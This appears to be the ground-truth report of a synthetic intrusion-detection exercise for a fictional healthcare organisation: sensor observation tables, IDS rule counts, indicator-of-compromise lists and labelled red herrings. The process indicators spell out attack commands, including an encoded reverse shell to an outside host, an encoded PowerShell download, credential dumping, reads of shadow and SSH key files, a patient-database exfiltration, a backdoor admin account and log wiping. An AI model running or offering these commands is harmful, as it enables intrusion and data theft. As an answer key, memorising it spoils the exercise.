| evt-005 | zeek | delayed: 3 |
| evt-006 | asa | delayed: 31 |
| evt-006 | bash_history | visible: 6 |
| evt-006 | ecar | delayed: 54 |
| evt-006 | syslog | delayed: 8 |
| evt-006 | sysmon | delayed: 8 |
| evt-006 | windows_security | delayed: 5 |
| evt-006 | zeek | delayed: 29, visible: 2 |
| evt-007 | bash_history | visible: 3 |
| evt-007 | ecar | delayed: 6 |
| evt-008 | asa | delayed: 3, filtered: 1 |
| evt-008 | ecar | delayed: 7 |
| evt-008 | ids | delayed: 2 |
| evt-008 | syslog | delayed: 4 |
| evt-008 | windows_security | delayed: 2 |
| evt-008 | zeek | delayed: 6 |
| evt-009 | bash_history | visible: 2 |
| evt-009 | ecar | delayed: 4 |
| evt-010 | ecar | delayed: 8 |
| evt-010 | sysmon | delayed: 8 |
| evt-010 | windows_security | delayed: 2 |
| evt-011 | ecar | delayed: 1 |
| evt-011 | syslog | delayed: 1 |
| evt-011 | windows_security | delayed: 1 |
| evt-012 | asa | delayed: 2, filtered: 5 |
| evt-012 | ecar | delayed: 15, dropped: 1 |
| evt-012 | sysmon | delayed: 4, dropped: 2 |
| evt-012 | windows_security | delayed: 22 |
| evt-012 | zeek | delayed: 7, visible: 1 |
| evt-013 | asa | delayed: 2, filtered: 1 |
| evt-013 | ecar | delayed: 45 |
| evt-013 | sysmon | delayed: 42 |
| evt-013 | windows_security | delayed: 19 |
| evt-013 | zeek | delayed: 3, visible: 1 |
| evt-014 | ecar | delayed: 13 |
| evt-014 | sysmon | delayed: 13 |
| evt-014 | windows_security | delayed: 2 |
| evt-015 | asa | delayed: 3 |
| evt-015 | ecar | delayed: 15, dropped: 9 |
| evt-015 | sysmon | delayed: 22 |
| evt-015 | windows_security | delayed: 11 |
| evt-015 | zeek | delayed: 4 |
| evt-016 | ecar | delayed: 34 |
| evt-016 | sysmon | delayed: 34 |
| evt-016 | windows_security | delayed: 8, dropped: 1, visible: 1 |
| evt-017 | asa | delayed: 2 |
| evt-017 | ecar | delayed: 33 |
| evt-017 | sysmon | delayed: 32 |
| evt-017 | windows_security | delayed: 11 |
| evt-017 | zeek | delayed: 3 |
| evt-018 | asa | delayed: 21, dropped: 1, out_of_window: 6 |
| evt-018 | ecar | delayed: 29, dropped: 2, out_of_window: 5 |
| evt-018 | proxy | delayed: 9, out_of_window: 1 |
| evt-018 | sysmon | delayed: 17, out_of_window: 1 |
| evt-018 | windows_security | delayed: 13, out_of_window: 4, visible: 1 |
| evt-018 | zeek | delayed: 42, out_of_window: 16, visible: 10 |
| evt-019 | asa | delayed: 3, out_of_window: 1 |
| evt-019 | ecar | delayed: 3, out_of_window: 1 |
| evt-019 | proxy | delayed: 3, out_of_window: 1 |
| evt-019 | sysmon | delayed: 3, out_of_window: 1 |
| evt-019 | zeek | delayed: 6, out_of_window: 2 |
| evt-020 | asa | delayed: 26, filtered: 277 |
| evt-020 | ecar | delayed: 301, dropped: 2 |
| evt-020 | ids | delayed: 5, dropped: 1, filtered: 260, visible: 1 |
| evt-020 | sysmon | delayed: 22 |
| evt-020 | windows_security | delayed: 316, dropped: 1, visible: 3 |
| evt-020 | zeek | delayed: 446, filtered: 10, visible: 150 |
| evt-021 | asa | delayed: 89, visible: 2 |
| evt-021 | ecar | delayed: 91 |
| evt-021 | ids | delayed: 18, dropped: 1, filtered: 162 |
| evt-021 | windows_security | delayed: 90, visible: 1 |
| evt-021 | zeek | delayed: 148, visible: 34 |
| evt-022 | asa | delayed: 1 |
| evt-022 | ecar | delayed: 27 |
| evt-022 | sysmon | delayed: 26 |
| evt-022 | windows_security | delayed: 9 |
| evt-022 | zeek | visible: 1 |
| evt-023 | asa | filtered: 3 |
| evt-023 | bash_history | visible: 12 |
| evt-023 | ecar | delayed: 40, dropped: 1 |
| evt-023 | syslog | delayed: 10 |
| evt-023 | windows_security | delayed: 1 |
| evt-023 | zeek | delayed: 4 |
| evt-024 | windows_security | delayed: 1 |
| evt-025 | asa | delayed: 5 |
| evt-025 | ecar | delayed: 34 |
| evt-025 | proxy | delayed: 1 |
| evt-025 | sysmon | delayed: 28 |
| evt-025 | windows_security | delayed: 11 |
| evt-025 | zeek | delayed: 8, visible: 2 |
| evt-026 | asa | delayed: 3, filtered: 3 |
| evt-026 | ecar | delayed: 7 |
| evt-026 | proxy | delayed: 3 |
| evt-026 | zeek | delayed: 6, visible: 8 |
| evt-027 | ecar | delayed: 1 |
| evt-027 | windows_security | delayed: 2 |
| evt-028 | bash_history | visible: 1 |
| evt-028 | ecar | delayed: 2 |
| evt-029 | bash_history | visible: 1 |
| evt-029 | ecar | delayed: 3 |
| evt-030 | asa | delayed: 2 |
| evt-030 | ecar | delayed: 28 |
| evt-030 | proxy | delayed: 1 |
| evt-030 | sysmon | delayed: 27 |
| evt-030 | windows_security | delayed: 7 |
| evt-030 | zeek | delayed: 4 |
| evt-031 | asa | filtered: 3 |
| evt-031 | ecar | delayed: 3 |
| evt-031 | windows_security | delayed: 3 |
| evt-031 | zeek | delayed: 2, visible: 4 |
| evt-032 | ecar | delayed: 17 |
| evt-032 | sysmon | delayed: 17 |
| evt-032 | windows_security | delayed: 4 |
| evt-033 | ecar | delayed: 13 |
| evt-033 | sysmon | delayed: 12 |
| evt-033 | windows_security | delayed: 13 |
| evt-034 | ecar | delayed: 2 |
| evt-034 | sysmon | delayed: 1 |
| evt-034 | windows_security | delayed: 2 |
| evt-035 | ecar | delayed: 2 |
| evt-035 | syslog | delayed: 2 |
| evt-email-001 | asa | delayed: 8, filtered: 2 |
| evt-email-001 | ecar | delayed: 32 |
| evt-email-001 | proxy | delayed: 2 |
| evt-email-001 | syslog | delayed: 10 |
| evt-email-001 | sysmon | delayed: 23 |
| evt-email-001 | windows_security | delayed: 10 |
| evt-email-001 | zeek | delayed: 18, visible: 4 |
| evt-email-002 | asa | delayed: 2 |
| evt-email-002 | ecar | delayed: 2 |
| evt-email-002 | proxy | delayed: 1 |
| evt-email-002 | sysmon | delayed: 1 |
| evt-email-002 | zeek | delayed: 4 |
| evt-email-003 | asa | delayed: 7, filtered: 3 |
| evt-email-003 | ecar | delayed: 48 |
| evt-email-003 | syslog | delayed: 12 |
| evt-email-003 | sysmon | delayed: 31, dropped: 16 |
| evt-email-003 | windows_security | delayed: 24 |
| evt-email-003 | zeek | delayed: 22, visible: 2 |
| evt-email-004 | all | out_of_window: 2 |
| evt-email-004 | asa | delayed: 8, filtered: 2, visible: 1 |
| evt-email-004 | ecar | delayed: 25 |
| evt-email-004 | syslog | delayed: 20 |
| evt-email-004 | sysmon | delayed: 1, dropped: 10 |
| evt-email-004 | windows_security | delayed: 8 |
| evt-email-004 | zeek | delayed: 17, visible: 11 |
| evt-email-005 | asa | delayed: 3 |
| evt-email-005 | ecar | delayed: 3 |
| evt-email-005 | syslog | delayed: 2 |
| evt-email-005 | windows_security | delayed: 2 |
| evt-email-005 | zeek | delayed: 2, visible: 4 |
| evt-email-006 | asa | delayed: 3 |
| evt-email-006 | ecar | delayed: 6 |
| evt-email-006 | syslog | delayed: 8 |
| evt-email-006 | sysmon | delayed: 5 |
| evt-email-006 | windows_security | delayed: 3 |
| evt-email-006 | zeek | delayed: 4, visible: 5 |
| evt-email-007 | asa | delayed: 6, filtered: 1 |
| evt-email-007 | ecar | delayed: 13 |
| evt-email-007 | syslog | delayed: 9 |
| evt-email-007 | windows_security | delayed: 4 |
| evt-email-007 | zeek | delayed: 8, visible: 12 |
| evt-email-008 | asa | delayed: 4, filtered: 2 |
| evt-email-008 | ecar | delayed: 26 |
| evt-email-008 | proxy | delayed: 1 |
| evt-email-008 | syslog | delayed: 11 |
| evt-email-008 | sysmon | delayed: 22 |
| evt-email-008 | windows_security | delayed: 6 |
| evt-email-008 | zeek | delayed: 11, visible: 5 |
| evt-email-009 | asa | delayed: 1 |
| evt-email-009 | ecar | delayed: 1 |
| evt-email-009 | syslog | delayed: 2 |
| evt-email-009 | sysmon | delayed: 1 |
| evt-email-009 | windows_security | delayed: 1 |
| evt-email-009 | zeek | delayed: 2 |
| evt-email-010 | asa | delayed: 1 |
| evt-email-010 | ecar | delayed: 1 |
| evt-email-010 | syslog | delayed: 2 |
| evt-email-010 | zeek | delayed: 5 |
| evt-email-011 | asa | delayed: 7, filtered: 2 |
| evt-email-011 | ecar | delayed: 14 |
| evt-email-011 | proxy | delayed: 1 |
| evt-email-011 | syslog | delayed: 9 |
| evt-email-011 | sysmon | delayed: 10 |
| evt-email-011 | windows_security | delayed: 10 |
| evt-email-011 | zeek | delayed: 12, visible: 13 |
| f41a2561-d3ff-4564-be5d-7c002015cf86 | ids | delayed: 1 |
| f56948f3-be55-4e79-8c2c-bd95138bd9fd | ids | delayed: 1 |
| f5a6849a-b976-4bcb-85d8-ccb360a28010 | ids | delayed: 1 |
| f5f4c563-cc30-41f2-85ef-4752695653e5 | ids | delayed: 2 |
| f931e9e3-9cb0-4825-8867-b3b287b54bbb | ids | delayed: 1 |
| fb78aac3-3182-46fc-9453-13afa4f018cf | ids | delayed: 1 |
| fc4eb40a-eca6-4cd3-a1fa-0a5de2d0088f | ids | delayed: 1 |
| fcac0146-463f-45a2-9fa9-f6cd75a97b8c | ids | delayed: 1 |
| fcc348bb-367b-4858-8ecb-fc136aea8ecf | ids | delayed: 1 |
| red_herring:rh-001 | ecar | delayed: 7 |
| red_herring:rh-001 | sysmon | delayed: 4 |
| red_herring:rh-001 | windows_security | delayed: 7 |
| red_herring:rh-002 | asa | delayed: 1 |
| red_herring:rh-002 | ecar | delayed: 37 |
| red_herring:rh-002 | sysmon | delayed: 36 |
| red_herring:rh-002 | windows_security | delayed: 12 |
| red_herring:rh-002 | zeek | delayed: 1 |
| red_herring:rh-003 | asa | delayed: 2 |
| red_herring:rh-003 | ecar | delayed: 5 |
| red_herring:rh-003 | ids | delayed: 1 |
| red_herring:rh-003 | proxy | delayed: 1 |
| red_herring:rh-003 | zeek | delayed: 2, visible: 2 |


## IDS Evaluation Summary

Observation totals: delayed=160, dropped=2, filtered=423, visible=5.

| Sensor | GID:SID | Candidates | Emitted | Policy Filtered | Origins | Digest |
|--------|---------|------------|---------|-----------------|---------|--------|
| snort-core | 1:2000357 | 3 | 3 | 0 | built_in=3 | `5ee0e3a4ac52` |
| snort-core | 1:2000560 | 2 | 2 | 0 | built_in=2 | `4d7d9a8dc20c` |
| snort-core | 1:2002911 | 1 | 1 | 0 | authored_attachment=1 | `de2d3ea30696` |
| snort-core | 1:2003068 | 1 | 1 | 0 | built_in=1 | `b3794a72cea8` |
| snort-core | 1:2016149 | 1 | 1 | 0 | built_in=1 | `f2e911324d99` |
| snort-core | 1:2024291 | 4 | 4 | 0 | built_in=4 | `76bcbd46de13` |
| snort-core | 1:2027757 | 7 | 7 | 0 | built_in=7 | `511184713850` |
| snort-core | 1:2027863 | 5 | 5 | 0 | built_in=5 | `a41928dfdd22` |
| snort-core | 1:2027865 | 94 | 13 | 81 | authored_attachment=9, built_in=4 | `14231af1b75b` |
| snort-core | 1:2029706 | 274 | 14 | 260 | authored_attachment=6, built_in=8 | `388b4155d4ba` |
| snort-core | 1:382 | 1 | 1 | 0 | built_in=1 | `78c17527eb70` |
| snort-perimeter | 1:2000334 | 2 | 2 | 0 | built_in=2 | `19b3a35693d2` |
| snort-perimeter | 1:2000357 | 4 | 4 | 0 | built_in=4 | `6e06fa202c49` |
| snort-perimeter | 1:2000428 | 1 | 1 | 0 | built_in=1 | `051420efceaf` |
| snort-perimeter | 1:2000575 | 6 | 6 | 0 | built_in=6 | `f1c2709adb0c` |
| snort-perimeter | 1:2002910 | 16 | 16 | 0 | built_in=16 | `e49d3a452b59` |
| snort-perimeter | 1:2002911 | 1 | 1 | 0 | authored_attachment=1 | `3c74cbd2f7ea` |
| snort-perimeter | 1:2003068 | 1 | 1 | 0 | built_in=1 | `19b5416a1be1` |
| snort-perimeter | 1:2010935 | 1 | 1 | 0 | built_in=1 | `b9cc7179fb3e` |
| snort-perimeter | 1:2013028 | 4 | 4 | 0 | built_in=4 | `8fe948fe1d9a` |
| snort-perimeter | 1:2013504 | 3 | 3 | 0 | authored_attachment=1, built_in=2 | `a6dc0123e949` |
| snort-perimeter | 1:2016360 | 6 | 6 | 0 | built_in=6 | `2e1f616e01e4` |
| snort-perimeter | 1:2018959 | 2 | 2 | 0 | built_in=2 | `5e4d023e1251` |
| snort-perimeter | 1:2022476 | 5 | 5 | 0 | built_in=5 | `d874cb9bfb53` |
| snort-perimeter | 1:2023672 | 3 | 3 | 0 | built_in=3 | `bcc9774ffcf0` |
| snort-perimeter | 1:2023882 | 2 | 2 | 0 | built_in=2 | `e43986b4f057` |
| snort-perimeter | 1:2024290 | 3 | 3 | 0 | built_in=3 | `9b42db3813aa` |
| snort-perimeter | 1:2024291 | 1 | 1 | 0 | built_in=1 | `154905209841` |
| snort-perimeter | 1:2024392 | 1 | 1 | 0 | built_in=1 | `eeb2c5946612` |
| snort-perimeter | 1:2024897 | 1 | 1 | 0 | built_in=1 | `5e7c848a6672` |
| snort-perimeter | 1:2025712 | 5 | 5 | 0 | built_in=5 | `d62bf1a20bbe` |
| snort-perimeter | 1:2025991 | 2 | 2 | 0 | built_in=2 | `8c1463ca2617` |
| snort-perimeter | 1:2027316 | 2 | 2 | 0 | built_in=2 | `7f43f40a39c1` |
| snort-perimeter | 1:2027757 | 1 | 1 | 0 | built_in=1 | `e32baa397abc` |
| snort-perimeter | 1:2027863 | 4 | 4 | 0 | built_in=4 | `e0436b7087f4` |
| snort-perimeter | 1:2027865 | 93 | 12 | 81 | authored_attachment=9, built_in=3 | `e113ef64848b` |
| snort-perimeter | 1:2028401 | 3 | 3 | 0 | built_in=3 | `5dc82804d0ad` |
| snort-perimeter | 1:2029706 | 6 | 6 | 0 | built_in=6 | `bc24a7f62f17` |
| snort-perimeter | 1:366 | 3 | 3 | 0 | built_in=3 | `258089d5804b` |
| snort-perimeter | 1:382 | 4 | 4 | 0 | built_in=4 | `72f0f818ebfd` |
| snort-perimeter | 1:384 | 8 | 8 | 0 | built_in=8 | `26bb1bad8649` |


## Indicators of Compromise (IOCs)

### Network IOCs

- 10.10.1.35 (Attacker IP)
- 10.10.1.35:3389 (Lateral Movement)
- 10.10.1.99 (Attacker IP)
- 10.10.2.10:389 (Internal Server)
- 10.10.2.30:22 (Lateral Movement)
- 10.10.3.10:443 (Web Scan Target)
- 10.10.3.20:22 (Internal Server)
- 10.10.4.10:22 (Lateral Movement)
- 203.14.220.10:443 (C2 Server)
- 2j3rhpi2329sn.top (DGA Domain)
- 30rgw6r7503.top (DGA Domain)
- 45.33.32.30:443 (Beacon Target)
- 45.33.32.30:443 (C2 Server)
- 45.33.32.30:443 (Denied Beacon Target)
- 45.33.32.30:8443 (C2 Server)
- 6cja6syvo02mu.top (DGA Domain)
- DC-01.meridianhcs.local (Malicious DNS Query)
- Message-ID: <100000I9EMNA.1000OREDIL@meridianhcs.com>
- Message-ID: <1000016ONZTK.10015EDCND@meridianhcs.com>
- Message-ID: <121609FF-AFF2-1350-BCEC-8A52032BE7D0@meridianhcs.com>
- Message-ID: <1486572785.976919.3e76dbd7@meridianhcs.com>
- Message-ID: <1746897100.499514.89c6aefa@meridianhcs.com>
- Message-ID: <billing-a1f65b41-3807664@medclaims-processing.net>
- Message-ID: <notices-b9dac45a-8235363@benefits-serviceportal.com>
- Message-ID: <workspace-e2b1dcaf-9440641@docflow-health.net>
- Port 22 (scan target)
- Port 3306 (scan target)
- Port 443 (scan target)
- Port 80 (scan target)
- Port 8080 (scan target)
- Port 8443 (scan target)
- SMTP Zeek UID: CCrUZUKS4IfMVXWF5TZ
- SMTP Zeek UID: CEccAUkX5SV859cXS2
- SMTP Zeek UID: COWqOMPIpfXZseQ3TV
- SMTP Zeek UID: CQ7I9b3jzxAVPSjUiY
- SMTP Zeek UID: CRztRxigXcXqGOLn2g
- SMTP Zeek UID: CUTRDf6Q4Ldi9jeMkuK
- SMTP Zeek UID: CXi0HWsnQMf8JYpS2Ro
- SMTP Zeek UID: CYDva5sTqH8TXqB5PE
- SMTP Zeek UID: CZORdrcTWEK6LKK1In
- SMTP Zeek UID: CceFDsPk9EzZcKgir
- SMTP Zeek UID: CdId6ZHLlPmlBFRn1v
- SMTP Zeek UID: CiZOoZV9UrWRQzxEHV
- SMTP Zeek UID: CkHfDHPFERTwVLepoU
- SMTP Zeek UID: CnfNhZUg1dg7L7JliiG
- SMTP Zeek UID: Cz6aty2KDqX3lIbAEC8
- Zeek UID: C06giQHABY3j1aTnr
- Zeek UID: C4djMHp1m62multLwl
- Zeek UID: C9YuQrfLkvTupaZzflN
- Zeek UID: CILY5ypYgxIfe7Yp04
- Zeek UID: CLLM52TL99CiTaERkJ
- Zeek UID: CPVaBvdGZpVybzyBmx
- Zeek UID: CQfwrCUjUb7KCZp6S9
- Zeek UID: Cnv4ETsQm7BAFrynO3c
- Zeek UID: Crg0DFACqt5dBMKLAIW
- Zeek UID: CwrSCCW4Z87Y2PCALP7
- api.westbridge-services.net (Malicious DNS Query)
- edge.westbridge-services.net (Malicious DNS Query)
- ewnjsaqf1rasgez5.top (DGA Domain)
- metrics.westbridge-services.net (Malicious DNS Query)
- ns1.westbridge-services.cloud (DNS Tunnel Endpoint)
- qrdqtp5nhn66chp00.top (DGA Domain)

### Process IOCs

- /bin/bash
- /usr/bin/cat
- /usr/bin/find
- /usr/bin/gzip
- /usr/bin/ls
- /usr/bin/mysqldump
- /usr/bin/nmap
- /usr/bin/scp
- /usr/bin/shred
- /usr/sbin/ip
- C:\Windows\System32\PSEXESVC.exe
- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- C:\Windows\System32\cmd.exe
- C:\Windows\System32\ms-index-service.exe
- C:\Windows\System32\net.exe
- C:\Windows\System32\sc.exe
- C:\Windows\System32\schtasks.exe
- C:\Windows\System32\wevtutil.exe
- C:\Windows\System32\whoami.exe
- Injection Target: C:\Windows\System32\lsass.exe
- Scheduled Task: \Microsoft\Windows\Maintenance\DeviceSync
- Service: DeviceSyncSvc
- Service: PSEXESVC
- `PSEXESVC.exe -accepteula`
- `bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC80NS4zMy4zMi4zMC84NDQzIDA+JjEi | base64 -d | bash'`
- `cat /etc/hosts`
- `cat /etc/passwd`
- `cat /etc/resolv.conf`
- `cat /etc/shadow`
- `cat /root/.ssh/id_rsa`
- `cat /var/www/html/config.php`
- `cmd.exe /c whoami && hostname`
- `find /opt/ehr -name '*credential*' -maxdepth 3`
- `gzip -9 /tmp/rpt_0318.sql`
- `history -c && cat /dev/null > ~/.bash_history`
- `ip addr show`
- `ls -la /root/.ssh`
- `ms-index-service.exe "privilege::debug" "sekurlsa::logonpasswords" exit`
- `mysqldump --single-transaction ehr patients insurance_claims > /tmp/rpt_0318.sql`
- `net group "Domain Admins" /domain`
- `net group "Domain Admins" svc_mhsync /add /domain`
- `net user /domain`
- `net user svc_mhsync /delete /domain`
- `net user svc_mhsync MhsSvc!2024 /add /domain`
- `net view /domain`
- `net view \\FILE-SRV-01`
- `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24`
- `nmap -sn 10.10.2.0/24`
- `powershell.exe -NoProfile -Command "Compress-Archive -Path \\FILE-SRV-01\Finance\Q1\*,\\FILE-SRV-01\Patients\Exports\* -DestinationPath C:\ProgramData\Microsoft\cache_7f3a.zip"`
- `powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBhAHAAaQAuAHcAZQBzAHQAYgByAGkAZABnAGUALQBzAGUAcgB2AGkAYwBlAHMALgBuAGUAdAAvAHYAMgAvAG0AYQBuAGkAZgBlAHMAdAAiACkA`
- `sc.exe create DeviceSyncSvc binPath= C:\Windows\System32\DeviceSyncSvc.exe obj= LocalSystem start= auto`
- `schtasks.exe /Create /TN "\Microsoft\Windows\Maintenance\DeviceSync" /SC HOURLY /TR "C:\Windows\System32\DeviceSyncSvc.exe" /RU SYSTEM`
- `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/.cache/rpt_0318.sql.gz`
- `shred -u /root/.bash_history`
- `wevtutil cl Security`
- `whoami /all`

### User IOCs

- Group: Domain Admins (compromised account)
- SYSTEM (compromised account)
- aisha.johnson (compromised account)
- aisha.johnson (Spray Target) (compromised account)
- apache (compromised account)
- diego.ramirez (compromised account)
- diego.ramirez (Spray Target) (compromised account)
- evelyn.brooks (compromised account)
- lina.nguyen (compromised account)
- marcus.chen (compromised account)
- marcus.chen (Explicit Credential Target) (compromised account)
- omar.haddad (compromised account)
- priya.patel (compromised account)
- root (compromised account)
- sophia.martinez (Spray Target) (compromised account)
- svc_mhsync (compromised account)

### File IOCs

- %SystemRoot%\PSEXESVC.exe
- /root/.bash_history
- /tmp/rpt_0318.sql
- C:\Windows\System32\DeviceSyncSvc.exe
- artifacts/email/benefits-confirmation-msg.eml
- artifacts/email/docflow-ai-summary-msg.eml
- artifacts/email/ehr-release-note-msg.eml
- artifacts/email/executive-operating-note-msg.eml
- artifacts/email/finance-forward-to-it-msg.eml
- artifacts/email/internal-reset-lure-msg.eml
- artifacts/email/vendor-interface-package-msg.eml


## Red Herrings

The following events appear suspicious but are benign. They are included to make the dataset more realistic.

| Timestamp | Actor | System | Activity | Why It's Benign |
|-----------|-------|--------|----------|-----------------|
| 2024-03-18 13:04:43 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:04:52 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:04:52 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:04:54 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 14:05:12 UTC | lina.nguyen | WS-LNGUYEN-01 | Developer refreshes Ubuntu package metadata from the public archive | Routine package maintenance uses the APT HTTP user agent and triggers a low-priority policy alert. |
| 2024-03-18 17:09:40 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
| 2024-03-18 17:09:41 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
| 2024-03-18 17:09:44 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
